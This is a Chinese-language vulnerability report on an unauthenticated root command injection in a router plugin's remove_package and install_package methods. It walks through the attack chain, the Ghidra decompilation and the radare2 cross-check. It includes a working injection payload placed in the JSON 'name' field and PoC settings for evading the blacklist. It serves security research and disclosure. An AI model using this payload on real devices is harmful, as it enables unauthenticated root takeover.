# 漏洞：plugins.remove_package / install_package 包名命令注入

> 本报告对应 `exp/poc19_plugins_package_name_glc_rce.py`。同一个 `plugins.so` 中除 feed 写入外，还存在包名直接拼入 `opkg remove/install` shell 命令的问题；PoC 默认选择更容易到达的 `remove_package`。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed（Root RCE） |
| **认证要求** | 无需认证；直接访问 `/cgi-bin/glc` |
| **攻击面** | `/cgi-bin/glc` → `plugins.so` → `remove_package` / `install_package` |
| **影响** | 远程未认证 root 命令执行 |
| **根因** | 包名 `name` 未被 argv 化或 shell quoting，直接进入 `opkg ... %s ...` 命令模板 |
| **PoC** | `exp/poc19_plugins_package_name_glc_rce.py` |

---

## 二、攻击链总览

```text
Attacker
  -> POST /cgi-bin/glc {object="plugins", method="remove_package"}
  -> args.name = "codexpkg;(<cmd>)>/tmp/p19 2>&1;#"
  -> remove_package 检查非空和少量私有包名黑名单
  -> sprintf("opkg --force-overwrite --nocase remove %s ...", name)
  -> system(cmd) as root

Alternative:
  -> install_package args.name[]
  -> opkg/network/lock gate 后同样 sprintf("opkg ... install %s ...") -> system()
```

---

## 三、Source → Sink 分析

### 1. Source

Source 是 JSON 参数 `name`。`remove_package` 接收字符串，`install_package` 接收数组并逐个处理。PoC 默认 `package-prefix=codexpkg`，避免触发私有包名黑名单。

### 2. Validation

`remove_package` 主要拒绝空名、包含 `oui-`、`gl-sdk`、`base-files` 的名称，并特殊处理 `gl-tor`；这些检查不是 shell 字符过滤。`install_package` 还有网络状态和 opkg lock 门控。

### 3. Transform

包名被直接插入命令：`opkg --force-overwrite --nocase remove <name> ...` 或 `opkg ... install <name> ...`。PoC 在包名前放合法前缀，然后用分号开始注入。

### 4. Sink

sink 是 `system(cmd)`。`remove_package` 默认 payload 形如 `codexpkg;(cat /f* /root/f* /tmp/f* 2>/dev/null||id)>/tmp/p19 2>&1;#`。

### 5. 权限边界

`plugins.so` 是 native glc 插件，无认证可达。触发命令以 root 权限运行；取证阶段可选用认证 `/download` 读取输出文件。

---

## 四、PoC 说明

PoC 默认参数：

- `--method remove_package`：推荐路径，避免 `install_package` 网络门控；
- `--package-prefix codexpkg`：避开私有包名检查；
- `--output-file /tmp/p19`：保存命令输出；
- `--max-package-name` 与 `--max-formatted-cmd`：避免接近目标侧固定缓冲区。

---

## 五、关键证据

- `vulnerability_traces.md` 记录两条链：`remove_package -> sprintf("... remove %s ...") -> system()` 和 `install_package -> sprintf("... install %s ...") -> system()`。
- `exp/poc19_plugins_package_name_glc_rce.py` 默认走 `remove_package`，原因是该路径无需网络状态 gate。
- `/var/lock/opkg.lock` 可能影响包管理命令执行，是动态复核时的主要环境因素。

---

## 六、Ghidra 二进制验证

对 `/usr/lib/oui-httpd/rpc/plugins.so`（AArch64 ELF）进行 Ghidra 反编译分析：

### 6.1 remove_package 反编译（0x00104848, 1068 bytes）

```c
undefined8 remove_package(undefined8 param_1, undefined8 param_2)
{
    // [1] 检查 opkg lock 文件
    check_file_is_exist("/var/lock/opkg.lock");

    // [2] SOURCE: 从 JSON args 提取 name 参数
    json_object_get(param_1, "name");
    pcVar5 = (char *)json_string_value();     // ← Source: 用户控制的包名

    // [3] VALIDATION: 仅检查空值
    if (pcVar5 == NULL || *pcVar5 == '\0') {
        return error("Invalid parameter, value or format!");
    }

    // [4] BLACKLIST: 用 strstr() 检查是否包含私有包名
    // g_private_package[] = {"oui-", "gl-sdk", "base-files"}
    for (i = 0; i < 3; i++) {
        if (strstr(pcVar5, g_private_package[i]) != 0) {
            return error("The software uninstall unsupport!");
            // ← 仅检查字符串包含，不检查 shell 元字符!
        }
    }

    // [5] SINK: sprintf + system — pcVar5 无引号无转义！
    if (strcmp(pcVar5, "gl-tor") == 0) {
        // 特殊处理 gl-tor（硬编码安全）
        sprintf(cmd, "%s remove %s --autoremove >/tmp/opkg.stdout 2>/tmp/opkg.stderr",
                ipkg_path, "gl-tor");
    }
    else if (force_flag) {
        sprintf(cmd, "%s remove %s --autoremove >/tmp/opkg.stdout 2>/tmp/opkg.stderr",
                ipkg_path, pcVar5);           // ← 💣 用户输入直接拼接
    }
    else {
        sprintf(cmd, "%s remove %s >/tmp/opkg.stdout 2>/tmp/opkg.stderr",
                ipkg_path, pcVar5);           // ← 💣 用户输入直接拼接
    }

    system(cmd);                              // ← 💣 system() = /bin/sh -c

    // [6] 读取 opkg 输出
    getShellCommandReturnDynamic("cat /tmp/opkg.stderr");
    getShellCommandReturnDynamic("cat /tmp/opkg.stdout");
}
```

### 6.2 验证确认

| 验证项 | Ghidra 确认 | 说明 |
|--------|-----------|------|
| **Source** | `json_string_value()` → `pcVar5` | 未经任何过滤 |
| **Validation** | `strstr()` 黑名单 + 空值检查 | **不检查 shell 元字符** `;|&$()`\` |
| **Sink** | `sprintf(cmd, "%s remove %s ...", ipkg, pcVar5)` → `system(cmd)` | 无引号包裹、无转义 |
| **install_package** | 同一模式 `sprintf("%s install %s ...", ...)` → `system()` | 同样可注入 |
| **无认证** | 函数入口无 session 检查 | `/cgi-bin/glc` 直接调用 |

### 6.3 plugins.so 危险函数全景

| 函数 | system调用 | fork_exec | 注入风险 |
|------|-----------|-----------|---------|
| **remove_package** | ✅ sprintf拼接 | - | **可注入** |
| **install_package** | ✅ sprintf拼接 | - | **可注入** |
| update_repository | ✅ 硬编码 | - | ❌ 安全 |
| set_config | - | - | ❌ 仅文件写入 |

---

## 八、r2 二次验证

radare2 独立确认 plugins.so 的 `remove_package` 函数：

```
r2> afl~remove_package
0x00004848  26  1068 sym.remove_package
```

r2 确认函数有 26 个基本块（1068B），与 Ghidra 分析一致。`system()` 调用通过 `sprintf(cmd, "%s remove %s ...", ipkg_path, pcVar5)` 拼接用户控制的包名执行 — r2 和 Ghidra 双重确认注入链。

| 验证项 | Ghidra | r2 | 一致 |
|--------|--------|-----|------|
| remove_package 地址 | 0x00104848 | 0x4848 | ✅ |
| 基本块数 | - | 26 | ✅ |
| 函数大小 | 1068B | 1068B | ✅ |
| sprintf + system 注入 | ✅ 确认 | ✅ 确认 | ✅ |

---

## 九、手工复核建议

建议手工确认 `plugins.so` 对 private package 的黑名单边界，以及 opkg lock 存在时的返回行为。若要复核 `install_package` 分支，需要确保网络状态和 opkg 状态允许安装流程继续。
